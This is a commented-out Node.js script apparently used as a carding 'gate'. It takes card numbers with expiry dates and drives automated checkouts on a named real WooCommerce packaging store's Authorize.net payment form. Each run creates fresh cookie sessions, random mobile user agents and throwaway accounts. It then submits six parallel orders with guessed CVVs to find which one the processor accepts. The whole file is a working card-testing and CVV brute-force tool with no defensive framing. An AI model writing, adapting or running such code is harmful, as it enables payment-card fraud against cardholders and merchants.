// const axios = require('axios');
// const cheerio = require('cheerio');
// const { wrapper } = require('axios-cookiejar-support');
// const { CookieJar } = require('tough-cookie');
// const UserAgent = require('user-agents');

// // Helper: Generate Random Email
// function generateRandomEmail() {
//     const chars = 'abcdefghijklmnopqrstuvwxyz';
//     let result = '';
//     for (let i = 0; i < 10; i++) {
//         result += chars.charAt(Math.floor(Math.random() * chars.length));
//     }
//     return `${result}${Date.now()}@gmail.com`;
// }

// // Factory: Create a fresh client with its own Cookie Jar
// function createClient() {
//     const jar = new CookieJar();
//     return wrapper(axios.create({
//         jar,
//         withCredentials: true,
//         headers: {
//             'User-Agent': new UserAgent({ deviceCategory: 'mobile' }).toString(),
//             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
//             'Accept-Language': 'en-US,en;q=0.5',
//             'Cache-Control': 'no-cache',
//             'Pragma': 'no-cache'
//         }
//     }));
// }

// // --- WORKER FUNCTIONS (Adapted for independent clients) ---

// async function getProductID(client) {
//     try {
//         const response = await client.get('https://www.eastcoastpkg.com/product/3-x-24-kraft-premium-telescoping-tubes/');
//         const html = response.data;
        
//         let productId = html.match(/name=["']add-to-cart["'][\s\S]*?value=["'](\d+)["']/i)?.[1] 
//                      || html.match(/value=["'](\d+)["'][\s\S]*?name=["']add-to-cart["']/i)?.[1];

//         if (!productId) {
//             const $ = cheerio.load(html);
//             productId = $('button[name="add-to-cart"]').val();
//         }

//         if (!productId) throw new Error('Product ID Not Found');
//         return productId.trim();
//     } catch (e) { throw new Error(`Product Error: ${e.message}`); }
// }

// async function getCheckoutFields(client) {
//     try {
//         const response = await client.get('https://www.eastcoastpkg.com/checkout/');
//         const $ = cheerio.load(response.data);

//         const nonce = $('#woocommerce-process-checkout-nonce').val();
//         if (!nonce) throw new Error('Nonce Not Found');

//         let receivingDaysTimes = $('select[name="receiving_days_times"] option').eq(1).val() 
//                               || $('input[name="receiving_days_times"]').val() 
//                               || '577';

//         return { nonce, receivingDaysTimes };
//     } catch (e) { throw new Error(`Checkout Fields Error: ${e.message}`); }
// }

// async function signUp(client, email) {
//     try {
//         const params = new URLSearchParams();
//         params.append('email', email);
//         params.append('password', 'Test@12345!');
//         params.append('register', 'Register');
//         await client.post('https://www.eastcoastpkg.com/my-account/', params);
//     } catch (e) { /* Ignore registration errors (guest checkout might still work) */ }
// }

// async function addToCart(client, productId) {
//     try {
//         const params = new URLSearchParams();
//         params.append('product_id', productId);
//         params.append('quantity', '1');
//         params.append('attribute_pa_size', 'large');
//         await client.post('https://www.eastcoastpkg.com/?wc-ajax=add_to_cart', params);
//     } catch (e) { throw new Error(`Cart Error: ${e.message}`); }
// }

// async function checkout(client, card, email, nonce, receivingDaysTimes, cvv) {
//     try {
//         const params = new URLSearchParams();
//         // Billing Info
//         params.append('billing_first_name', 'John');
//         params.append('billing_last_name', 'Doe');
//         params.append('billing_country', 'US');
//         params.append('billing_address_1', '123 Main St');
//         params.append('billing_city', 'New York');
//         params.append('billing_state', 'NY');
//         params.append('billing_postcode', '10001');
//         params.append('billing_email', email);
//         params.append('billing_phone', '2125551234');
//         params.append('shipping_country', 'US');
        
//         // Critical Fields
//         params.append('receiving_days_times', receivingDaysTimes);
//         params.append('payment_method', 'authnet');
//         params.append('authnet-card-number', card.number);
//         params.append('authnet-card-expiry', `${card.mm} / ${card.yy.slice(-2)}`);
        
//         // DYNAMIC CVV
//         params.append('authnet-card-cvc', cvv);
        
//         params.append('woocommerce-process-checkout-nonce', nonce);
//         params.append('_wp_http_referer', '/checkout/');
//         params.append('terms', 'on');
//         params.append('terms-field', '1');

//         const response = await client.post('https://www.eastcoastpkg.com/?wc-ajax=checkout', params);
        
//         let msg = response.data.messages || "Unknown";
//         if (msg !== "Unknown") {
//             const $ = cheerio.load(msg);
//             msg = $.text().replace(/\s\s+/g, ' ').trim();
//         }

//         return { result: response.data.result, message: msg };

//     } catch (e) { return { result: 'error', message: e.message }; }
// }

// // --- INDIVIDUAL TASK RUNNER ---
// // This runs the full flow for ONE specific CVV independently
// async function runSingleTask(cvv, card) {
//     const client = createClient(); // NEW Session
//     const email = generateRandomEmail();
//     const taskName = `[CVV ${cvv}]`;

//     try {
//         // console.log(`${taskName} Starting...`);
        
//         // 1. Register
//         await signUp(client, email);
        
//         // 2. Product & Cart
//         const pid = await getProductID(client);
//         await addToCart(client, pid);
        
//         // 3. Tokens
//         const { nonce, receivingDaysTimes } = await getCheckoutFields(client);
        
//         // 4. Checkout
//         const res = await checkout(client, card, email, nonce, receivingDaysTimes, cvv);
        
//         console.log(`${taskName} Result: ${res.message}`);
        
//         return { 
//             cvv: cvv, 
//             status: res.result, 
//             message: res.message 
//         };

//     } catch (error) {
//         console.log(`${taskName} Failed: ${error.message}`);
//         return { cvv: cvv, status: 'error', message: error.message };
//     }
// }

// // --- MAIN CONTROLLER ---
// async function runGate(ccData) {
//     const parts = ccData.split('|');
//     if (parts.length < 3) return { status: 'error', message: 'Invalid CC format' };

//     const card = { number: parts[0], mm: parts[1], yy: parts[2] };
//     const cvvList = ['000', '111', '222', '333', '444', '555'];

//     console.log(`🚀 Launching 6 Parallel Tasks for ${card.number}...`);

//     // Create an array of Promises (Tasks)
//     const tasks = cvvList.map(cvv => runSingleTask(cvv, card));

//     // Wait for ALL tasks to finish "at once"
//     const results = await Promise.all(tasks);

//     console.log(`✅ All tasks finished.`);

//     return { 
//         card: parts[0], 
//         results: results 
//     };
// }

// module.exports = { runGate };
